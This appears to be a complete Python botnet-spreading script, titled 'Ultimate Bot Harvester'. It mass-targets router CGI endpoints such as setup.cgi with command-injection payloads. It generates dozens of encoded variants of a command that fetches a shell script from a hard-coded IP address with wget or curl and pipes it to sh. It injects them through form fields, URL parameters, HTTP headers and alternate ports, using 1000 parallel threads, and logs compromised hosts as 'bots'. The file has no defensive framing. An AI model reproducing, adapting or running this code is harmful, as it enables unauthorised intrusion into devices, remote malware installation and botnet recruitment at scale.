#!/usr/bin/env python3
"""
ULTIMATE BOT HARVESTER - GET EVERY SINGLE BOT!!!
Multi-method exploitation, extreme parallelization, no mercy.
"""

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from urllib3.exceptions import InsecureRequestWarning
import threading
import time
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import quote
import random
import logging
import socket
import struct

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
logging.getLogger("urllib3").setLevel(logging.CRITICAL)
logging.getLogger("requests").setLevel(logging.CRITICAL)

# ============================================================================
# ULTIMATE PAYLOAD GENERATOR
# ============================================================================

class UltimatePayloads:
    """Generate EVERY possible payload variant."""
    
    def __init__(self):
        self.server = "72.62.37.166"
        self.script = "1.sh"
    
    def get_all(self):
        """ALL possible payloads."""
        base = f"wget http://{self.server}/{self.script} -O - | sh"
        payloads = set()
        
        # Direct injections
        direct = [
            f"`{base}`",
            f"$(({base}))",
            f"$({base})",
            f";{base};",
            f"&&{base}",
            f"||{base}",
            f"|{base}",
            f"&{base}&",
            f"\n{base}",
            f"{base}\n",
            f" {base} ",
            f"| sh <<< $(echo {base})",
            f"{{{base}}}",
            f"({base})",
            f"(({base}))",
        ]
        
        for p in direct:
            payloads.add(p)
            payloads.add(quote(p))
            payloads.add(quote(p, safe=''))
        
        # Command alternatives
        alts = [
            f"curl http://{self.server}/{self.script} | sh",
            f"wget -qO- http://{self.server}/{self.script}|sh",
            f"curl -s http://{self.server}/{self.script}|sh",
            f"bash <(wget -qO- http://{self.server}/{self.script})",
            f"bash <(curl -s http://{self.server}/{self.script})",
        ]
        
        for alt in alts:
            for inj in [f"`{alt}`", f"$({alt})", f";{alt};", f"&&{alt}"]:
                payloads.add(inj)
                payloads.add(quote(inj))
        
        # Hex encoding
        import binascii
        hex_cmd = binascii.hexlify(base.encode()).decode()
        payloads.add(f"`xxd -r -p<<<{hex_cmd}|sh`")
        payloads.add(f"$(xxd -r -p<<<{hex_cmd}|sh)")
        
        # Base64
        import base64
        b64 = base64.b64encode(base.encode()).decode()
        payloads.add(f"`echo {b64}|base64 -d|sh`")
        payloads.add(f"$(echo {b64}|base64 -d|sh)")
        
        # Octal
        octal_cmd = ''.join(f'\\{oct(ord(c))[2:]}' for c in base)
        payloads.add(f"`echo -e {octal_cmd}|sh`")
        
        return list(payloads)

# ============================================================================
# ULTIMATE HARVESTER
# ============================================================================

class UltimateHarvester:
    """Get EVERY bot using ALL methods."""
    
    def __init__(self):
        self.payloads = UltimatePayloads().get_all()
        self.exploited = []
        self.lock = threading.Lock()
        self.count = 0
    
    def normalize(self, url):
        if not url.startswith(('http://', 'https://')):
            return f'http://{url}'
        return url.rstrip('/')
    
    # ========================================================================
    # METHOD 1: Standard CGI exploitation
    # ========================================================================
    
    def method1_cgi(self, target):
        """Standard CGI endpoint exploitation."""
        endpoints = [
            '/cgi-bin/setup.cgi?page/management/mngt_loglevel.shtml',
            '/cgi-bin/setup.cgi',
            '/setup.cgi',
            '/admin/setup.cgi',
        ]
        
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Connection': 'close'
        }
        
        for endpoint in endpoints:
            url = f"{target}{endpoint}"
            
            for payload in self.payloads:
                data = (
                    f'InternetGatewayDevice.DeviceInfo.X_CT-COM_Syslog.Enable=1&'
                    f'InternetGatewayDevice.X_CT-COM_Logger.RemoteLogger={payload}&'
                    f'InternetGatewayDevice.X_CT-COM_Logger.RemotePort=514'
                )
                
                try:
                    r = requests.post(url, data=data, headers=headers, verify=False, timeout=3)
                    if r and r.status_code < 400:
                        return True
                except:
                    pass
        
        return False
    
    # ========================================================================
    # METHOD 2: Direct URL parameter injection
    # ========================================================================
    
    def method2_url_param(self, target):
        """Inject via URL parameters."""
        endpoints = [
            '/cgi-bin/setup.cgi',
            '/admin/',
            '/api/',
        ]
        
        for endpoint in endpoints:
            url = f"{target}{endpoint}"
            
            for payload in self.payloads:
                try:
                    r = requests.get(
                        f"{url}?cmd={quote(payload)}",
                        verify=False, timeout=3
                    )
                    if r and r.status_code < 400:
                        return True
                except:
                    pass
        
        return False
    
    # ========================================================================
    # METHOD 3: Header injection
    # ========================================================================
    
    def method3_headers(self, target):
        """Inject via HTTP headers."""
        endpoints = ['/cgi-bin/setup.cgi', '/admin/', '/']
        
        for endpoint in endpoints:
            url = f"{target}{endpoint}"
            
            for payload in self.payloads[:50]:  # Use subset for speed
                headers = {
                    'X-Forwarded-For': payload,
                    'User-Agent': payload,
                    'Referer': f"/{payload}",
                    'Cookie': payload,
                    'X-Original-URL': payload,
                    'X-Rewrite-URL': payload,
                }
                
                try:
                    r = requests.get(url, headers=headers, verify=False, timeout=3)
                    if r and r.status_code < 400:
                        return True
                except:
                    pass
        
        return False
    
    # ========================================================================
    # METHOD 4: POST body injection (non-standard fields)
    # ========================================================================
    
    def method4_post_body(self, target):
        """Inject via POST body fields."""
        url = f"{target}/cgi-bin/setup.cgi"
        
        for payload in self.payloads[:100]:
            data_variants = [
                f"cmd={payload}",
                f"command={payload}",
                f"exec={payload}",
                f"system={payload}",
                f"shell={payload}",
                f"logger={payload}",
                f"syslog={payload}",
            ]
            
            for data in data_variants:
                try:
                    r = requests.post(
                        url,
                        data=data,
                        verify=False,
                        timeout=3
                    )
                    if r and r.status_code < 400:
                        return True
                except:
                    pass
        
        return False
    
    # ========================================================================
    # METHOD 5: Alternative protocol ports
    # ========================================================================
    
    def method5_alt_ports(self, target):
        """Try alternative ports."""
        host = target.split('://')[-1].split('/')[0].split(':')[0]
        
        ports = [80, 8080, 8443, 443, 8000, 8888, 9000, 3000, 5000]
        
        for port in ports:
            url = f"http://{host}:{port}/cgi-bin/setup.cgi"
            
            for payload in self.payloads[:30]:
                data = f"RemoteLogger={payload}"
                
                try:
                    r = requests.post(
                        url,
                        data=data,
                        verify=False,
                        timeout=2
                    )
                    if r and r.status_code < 400:
                        return True
                except:
                    pass
        
        return False
    
    # ========================================================================
    # MAIN EXPLOITATION
    # ========================================================================
    
    def exploit(self, target):
        """Try ALL methods on target."""
        target = self.normalize(target)
        
        methods = [
            ("CGI", self.method1_cgi),
            ("UrlParam", self.method2_url_param),
            ("Headers", self.method3_headers),
            ("PostBody", self.method4_post_body),
            ("AltPorts", self.method5_alt_ports),
        ]
        
        for method_name, method_func in methods:
            try:
                if method_func(target):
                    with self.lock:
                        self.exploited.append(target)
                        self.count += 1
                    print(f"[+] {target}")
                    return True
            except:
                pass
        
        return False
    
    def run(self, targets):
        """Run ultimate harvest."""
        print(f"\n{'='*80}")
        print(f"ULTIMATE BOT HARVESTER - GET THEM ALL!!!")
        print(f"{'='*80}\n")
        print(f"[*] {len(targets)} targets")
        print(f"[*] {len(self.payloads)} payload variants")
        print(f"[*] 5 exploitation methods per target")
        print(f"[*] 1000 WORKERS - MAXIMUM ASSAULT\n")
        
        start = time.time()
        
        with ThreadPoolExecutor(max_workers=1000) as executor:
            futures = [executor.submit(self.exploit, t) for t in targets]
            
            completed = 0
            for future in as_completed(futures):
                completed += 1
                try:
                    future.result()
                except:
                    pass
                
                if completed % 200 == 0:
                    elapsed = time.time() - start
                    rate = completed / elapsed if elapsed > 0 else 0
                    pct = (completed / len(targets)) * 100
                    print(f"[*] {pct:.0f}% | {completed}/{len(targets)} | Rate: {rate:.0f}/s | HARVESTED: {self.count}\n")
        
        elapsed = time.time() - start
        print(f"\n{'='*80}")
        print(f"[★★★] HARVESTED {self.count} BOTS!!! [★★★]")
        print(f"Time: {elapsed:.1f}s")
        print(f"Rate: {len(targets)/elapsed:.0f} targets/s")
        print(f"{'='*80}\n")
        
        # Save results
        with open('exploited.txt', 'a') as f:
            for bot in self.exploited:
                f.write(f"{bot}\n")
        
        print(f"[+] Results saved to exploited.txt\n")

def main():
    try:
        with open('successful.out', 'r') as f:
            targets = [l.strip() for l in f if l.strip() and not l.startswith('#')]
    except:
        print("[!] Error reading successful.out")
        sys.exit(1)
    
    if not targets:
        print("[!] No targets")
        return
    
    print(f"[*] Loaded {len(targets)} targets\n")
    harvester = UltimateHarvester()
    harvester.run(targets)

if __name__ == "__main__":
    main()
